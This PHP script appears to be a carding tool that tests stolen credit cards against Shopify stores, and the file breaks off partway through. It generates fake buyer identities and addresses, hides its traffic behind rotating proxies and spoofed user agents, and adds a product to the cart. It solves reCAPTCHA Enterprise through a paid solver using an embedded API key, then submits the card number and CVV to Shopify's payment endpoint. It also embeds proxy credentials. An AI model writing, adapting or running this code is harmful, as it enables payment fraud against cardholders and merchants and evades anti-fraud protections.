<?php


$url = $_GET['url'];

$lista = $_GET['lista'];


function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    if (count($str) < 2) {
        return "null"; 
    }
    $str = explode($end, $str[1]);
    if (count($str) < 2) {
        return "null"; 
    }
    return $str[0];
}

function ShopifyIa($url, $card,$solver){


$separa = explode("|", $card);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];


if ($mes < 10) {
    $mes = substr($mes, -1);
}

if(strlen($ano ) == 2 ){
  $ano = "20".$ano;
}


$pag_host = explode("/", $url)[2];

$socks5 = 'all.dc.smartproxy.com:10000';
$rotate = 'Testingthis123:Testingpassword12+';

$solver = null;


$user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPad; CPU iPadOS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
  ];
  
$ua = $user_agents[array_rand($user_agents)];


$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, "https://randomuser.me/api/?nat=us");
curl_setopt($ch, CURLOPT_USERAGENT, $ua);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_AUTOREFERER, true);
$curl = curl_exec($ch);
$data = json_decode($curl, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"]) . strtolower($user["name"]["last"]) .rand(111,22299). '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];
$phone = $user["phone"];



"Name Full: $firstname $lastname \n";
"Email: $email \n";
"URL: $url \n host: $pag_host\n";

$cookies = tempnam(sys_get_temp_dir(), 'cookie');


"user_agents: $ua \n";

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://'.$pag_host.'/products.json');
curl_setopt($ch, CURLOPT_USERAGENT, $ua);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: '.$pag_host.'';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_AUTOREFERER, true);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
$curl = curl_exec($ch);
$data = json_decode($curl, true);
foreach ($data['products'] as $product) {
    foreach ($product['variants'] as $variant) {
        if ($variant['available'] === true && floatval($variant['price']) > 20) {
            $variant_id = $variant['id'];
            break 2; 
        }
    }}


"variants: $variant_id \n";

if(empty($variant_id)){
    $resp = "No se encontró el producto";
    return $resp;
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://'.$pag_host.'/cart/add.js');
curl_setopt($ch, CURLOPT_USERAGENT, $ua);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: '.$pag_host.'';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Origin: https://'.$pag_host.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_AUTOREFERER, true);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'id='.$variant_id.'&quantity=1');
$curl = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://'.$pag_host.'/cart');
curl_setopt($ch, CURLOPT_USERAGENT, $ua);
$headers = array();
$headers[] = 'Host: '.$pag_host.'';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_AUTOREFERER, true);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'checkout=');
$curl = curl_exec($ch);
$TOKEN = GetStr($curl, 'authenticity_token" value="', '"');
$country = GetStr($curl, 'data-pure-numeric-postal-code="false" selected="selected" value="', '"');
$localization = GetStr($curl, 'localization=', ';');

$co = [
    "AU" => ["generator" => "World/au_address_generator", "country" => "Australia"],
    "US" => ["generator" => "usa_address_generator", "country" => "United States"],
    "CA" => ["generator" => "World/ca_address_generator", "country" => "Canada"],
    "UK" => ["generator" => "World/uk_address_generator", "country" => "United Kingdom"],
    "GB" => ["generator" => "World/Germany_address_generator", "country" => "Germany"],
];


$g = $co[$localization]['generator'];
$country = $co[$localization]['country'];


$retries = 0;


while (true) {

$get = file_get_contents("https://www.worldnamegenerator.com/$g");
$street = (trim(strip_tags(GetStr($get,'<td>Street','</tr>'))));
$city = strtoupper(trim(strip_tags(GetStr($get,'<td>City','</tr>'))));
$regioncode = trim(strip_tags(GetStr($get,'<td>State/Province abbr','</b></td>')));
$state = trim(strip_tags(GetStr($get,'<td>State/Province full','</b></td>')));
$zip = trim(strip_tags(GetStr($get,'<td>Zip Code/Postal code','</tr>')));
$url = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);

if ($street != "null" ) {
    break;
}

$retries++;
if ($retries >= 3) {
    $status = "Error: Unknown !⚠️";
    echo $response = "Maximun retries reached (3/3)";
    break;
}
}

echo "url: $url \n Country : $country";

if(substr_count($curl, "grecaptcha.render")){
"Procesando solution...";
$SITEKEY = GetStr($curl, 'sitekey: "', '"');
$cursl = GetStr($curl, 'var recaptchaCallback = function() {', '//]]>');
$s = GetStr($cursl, "s: '", "'");

//---------------- Data Solver-----------------

$data = [
    'clientKey' => 'CAP-5361C0C774F336BECC410D69E869566E',
    'task' => [
        'type' => 'ReCaptchaV2EnterpriseTaskProxyLess',
        'websiteURL' => $url,
        "websiteKey" => $SITEKEY,
        'enterprisePayload' =>  [
            "s" => $s
      ],
    ],
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.capsolver.com/createTask');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER,  [
    'Host: api.capsolver.com',
    'Content-Type: application/json'
]);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
$curl = curl_exec($ch);
$js = json_decode($curl, true);
$taskId = $js["taskId"];

while (true) {

sleep(2);

$data = [
    'clientKey' => '',
    'taskId' => $taskId,
];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.capsolver.com/getTaskResult');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER,  [
    'Host: api.capsolver.com',
    'Content-Type: application/json'
]);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
$curl = curl_exec($ch);
$js = json_decode($curl, true);
$status = $js["status"];

if ($status != "processing") {
    break;
}
}

$captcha = $js["solution"]['gRecaptchaResponse'];




"\n";
"Finish ... recaptcha";
"\n";
"gRecaptchaResponse : $captcha";
"\n";

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_USERAGENT, $ua);
$headers = array();
$headers[] = 'Host: '.$pag_host.'';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Referer: https://'.$pag_host.'/';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://'.$pag_host.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.urlencode($TOKEN).'&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D='.urlencode($email).'&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D='.urlencode($country).'&checkout%5Bshipping_address%5D%5Bfirst_name%5D='.$firstname.'&checkout%5Bshipping_address%5D%5Blast_name%5D='.$lastname.'&checkout%5Bshipping_address%5D%5Baddress1%5D='.urlencode($street).'&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D='.urlencode($city).'&checkout%5Bshipping_address%5D%5Bprovince%5D='.$regioncode.'&checkout%5Bshipping_address%5D%5Bzip%5D='.$zip.'&checkout%5Bshipping_address%5D%5Bphone%5D='.urlencode($phone).'&checkout%5Bremember_me%5D=&checkout%5Bremember_me%5D=0&g-recaptcha-response='.$captcha.'&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1366&checkout%5Bclient_details%5D%5Bbrowser_height%5D=681&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');
$curl = curl_exec($ch);

goto a;
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_USERAGENT, $ua);
$headers = array();
$headers[] = 'Host: '.$pag_host.'';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Referer: https://'.$pag_host.'/';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://'.$pag_host.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_AUTOREFERER, true);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.urlencode($TOKEN).'&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D='.urlencode($email).'&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D='.urlencode($country).'&checkout%5Bshipping_address%5D%5Bfirst_name%5D='.$firstname.'&checkout%5Bshipping_address%5D%5Blast_name%5D='.$lastname.'&checkout%5Bshipping_address%5D%5Baddress1%5D='.urlencode($street).'&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D='.urlencode($city).'&checkout%5Bshipping_address%5D%5Bprovince%5D='.$regioncode.'&checkout%5Bshipping_address%5D%5Bzip%5D='.$zip.'&checkout%5Bshipping_address%5D%5Bphone%5D='.urlencode($phone).'&checkout%5Bremember_me%5D=&checkout%5Bremember_me%5D=0&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1366&checkout%5Bclient_details%5D%5Bbrowser_height%5D=681&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');
$curl = curl_exec($ch);

a:

$TOKEN = GetStr($curl, 'authenticity_token" value="', '"');
$shipping_method = getStr($curl, '<div class="radio-wrapper" data-shipping-method="', '"');


if($TOKEN == "null"|| $shipping_method== "null"){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
    curl_setopt($ch, CURLOPT_URL, "$url?previous_step=contact_information&step=shipping_method");
    curl_setopt($ch, CURLOPT_USERAGENT, $ua);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array();
    $headers[] = 'Host: '.$pag_host.'';
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_AUTOREFERER, true);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
    $curl = curl_exec($ch);
    $TOKEN = GetStr($curl, 'authenticity_token" value="', '"');
    $shipping_method = getStr($curl, '<div class="radio-wrapper" data-shipping-method="', '"');
}if($TOKEN == "null"|| $shipping_method== "null"){

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
    curl_setopt($ch, CURLOPT_URL, "$url/shipping_rates?step=shipping_method");
    curl_setopt($ch, CURLOPT_USERAGENT, $ua);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array();
    $headers[] = 'Host: '.$pag_host.'';
    $headers[] = 'Accept: */*';
    $headers[] = 'Referer: https://'.$pag_host.'/';
    $headers[] = 'X-Requested-With: XMLHttpRequest';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_AUTOREFERER, true);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
    $curl = curl_exec($ch);
    
    sleep(3); 
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
    curl_setopt($ch, CURLOPT_URL, "$url/shipping_rates?step=shipping_method");
    curl_setopt($ch, CURLOPT_USERAGENT, $ua);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array();
    $headers[] = 'Host: '.$pag_host.'';
    $headers[] = 'Referer: https://'.$pag_host.'/';
    $headers[] = 'X-Requested-With: XMLHttpRequest';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_AUTOREFERER, true);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
    $curl = curl_exec($ch);
    $TOKEN = GetStr($curl, 'authenticity_token" value="', '"');
    $shipping_method = getStr($curl, '<div class="radio-wrapper" data-shipping-method="', '"');
}

"TOKEN: $TOKEN \n shipping_method : $shipping_method";

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_USERAGENT, $ua);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: '.$pag_host.'';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Referer: https://'.$pag_host.'/';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://'.$pag_host.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_AUTOREFERER, true);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.urlencode($TOKEN).'&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D='.urlencode($shipping_method).'&checkout%5Bclient_details%5D%5Bbrowser_width%5D=506&checkout%5Bclient_details%5D%5Bbrowser_height%5D=681&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');
$curl = curl_exec($ch);
$total = GetStr($curl, 'data-checkout-payment-due-target="', '"');
$payment_gateway = getStr($curl, 'payment_gateway_', '"');

if($total == "null" OR $payment_gateway == "null"){
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, "$url?step=payment_method");
curl_setopt($ch, CURLOPT_USERAGENT, $ua);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: '.$pag_host.'';
$headers[] = 'Referer: https://'.$pag_host.'/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_AUTOREFERER, true);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
$curl = curl_exec($ch);
$total = GetStr($curl, 'data-checkout-payment-due-target="', '"');
$payment_gateway = getStr($curl, 'payment_gateway_', '"');
}

"total: $total \n payment_gateway : $payment_gateway";

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://deposit.us.shopifycs.com/sessions');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: deposit.us.shopifycs.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0';
$headers[] = 'Accept: application/json';
$headers[] = 'Referer: https://checkout.shopifycs.com/';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Origin: https://checkout.shopifycs.com';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$cc.'","name":"'.$firstname.' '.$lastname.'","month":'.$mes.',"year":'.$ano.',"verification_value":"'.$cvv.'"},"payment_session_scope":"'.$pag_host.'"}');
$curl = curl_exec($ch);
$id_sh = getStr($curl, '"id":"', '"');
"id_sh: $id_sh \n";

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: '.$pag_host.'';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Referer: https://'.$pag_host.'/';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://'.$pag_host.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_AUTOREFERER, true);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$TOKEN.'&previous_step=payment_method&step=&s='.$id_sh.'&checkout%5Bpayment_gateway%5D='.$payment_gateway.'&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Btotal_price%5D='.$total.'&checkout_submitted_request_url=&checkout_submitted_page_id=&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=506&checkout%5Bclient_details%5D%5Bbrowser_height%5D=681&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');
$curl = curl_exec($ch);
sleep(5);

if(substr_count($curl, "grecaptcha.render")){
"Procesando solution...";
$SITEKEY = GetStr($curl, 'sitekey: "', '"');
$cursl = GetStr($curl, 'var recaptchaCallback = function() {', '//]]>');
$s = GetStr($cursl, "s: '", "'");

//---------------- Data Solver-----------------
$data = [
    'clientKey' => 'CAP-5361C0C774F336BECC410D69E869566E',
    'task' => [
        'type' => 'ReCaptchaV2EnterpriseTaskProxyLess',
        'websiteURL' => $url,
        "websiteKey" => $SITEKEY,
        'enterprisePayload' =>  [
            "s" => $s
      ],
    ],
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.capsolver.com/createTask');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER,  [
    'Host: api.capsolver.com',
    'Content-Type: application/json'
]);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
$curl = curl_exec($ch);
$js = json_decode($curl, true);
$taskId = $js["taskId"];

while (true) {

sleep(2);

$data = [
    'clientKey' => '',
    'taskId' => $taskId,
];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.capsolver.com/getTaskResult');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER,  [
    'Host: api.capsolver.com',
    'Content-Type: application/json'
]);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
